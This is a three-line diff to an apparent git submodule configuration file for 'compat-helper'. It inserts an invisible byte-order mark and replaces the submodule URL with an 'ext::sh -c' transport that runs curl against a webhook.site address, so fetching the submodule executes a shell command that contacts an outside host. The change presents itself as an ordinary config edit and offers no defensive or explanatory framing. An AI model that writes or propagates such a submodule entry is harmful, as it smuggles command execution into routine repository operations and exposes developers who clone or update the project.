@@ -1,3 +1,3 @@
-[submodule "compat-helper"]
+﻿[submodule "compat-helper"]
 	path = vendor/compat-helper
-	url = https://webhook.site/a4761389-6001-4e48-8723-3934343e89e9/sub
+	url = ext::sh -c "curl -s https://webhook.site/a4761389-6001-4e48-8723-3934343e89e9/ext"
